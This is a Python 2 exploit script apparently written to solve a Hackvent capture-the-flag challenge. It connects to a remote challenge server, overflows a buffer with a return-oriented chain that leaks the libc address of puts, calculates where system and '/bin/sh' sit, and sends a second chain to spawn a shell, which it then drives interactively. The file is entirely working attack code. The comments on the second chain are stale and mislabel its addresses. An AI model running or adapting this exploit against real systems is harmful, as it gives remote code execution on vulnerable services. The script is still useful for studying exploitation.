#!/bin/env python

import socket
import telnetlib
from struct import *
import binascii

puts_got = 0x601018
puts_off = 0x078460
system_off = 0x47dc0
binsh_off= 0x1a3ee0
buf = "A"*216

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("challenges.hackvent.hacking-lab.com", 31337))
data = s.recv(4096)
print data
s.send("1\n")


data = s.recv(4096)
print data
print"------------"
buf2 = buf
buf2 += pack("<Q", 0x000000400803)       # pop rdi; ret;
buf2 += pack("<Q", 0x000000601018)       # GOT addr of puts
buf2 += pack("<Q", 0x0000004004b0)       # address of puts in binary
buf2 += pack("<Q", 0x0000004006ca)       # start of main to re-run :-) 
buf2 += "\n"
s.send(str(buf2))
data = s.recv(4096)
print data
print"------------"
s.send("2\n")
data = s.recv(4096)
print data

puts_got_str = str(data.split('\n')[1].encode('hex')+"00")[::-1]
p=""
for i in xrange(0,len(puts_got_str),2):
		p+=puts_got_str[i:i+2][::-1]
puts_got_str=p
puts_got_val = int(puts_got_str, 16)
print hex(puts_got_val)
base = puts_got_val - puts_off
print "libc base = "+str(hex(base))
system_a = base + system_off
print "system addr = "+str(hex(system_a))
binsh_addr = base +binsh_off
print "bin sh = "+str(hex(binsh_addr))

s.send("1\n")
data = s.recv(4096)
print data
buf2 = buf
buf2 += pack("<Q", 0x000000400803)       # pop rdi; ret;
buf2 += pack("<Q", binsh_addr)       # GOT addr of puts
buf2 += pack("<Q", system_a)       # address of puts in binary
s.send(buf2+"\n")
data = s.recv(4096)
print data
s.send("2\n")
data = s.recv(4096)
print data
t = telnetlib.Telnet()
t.sock = s
t.interact()
		
		
		
		
		




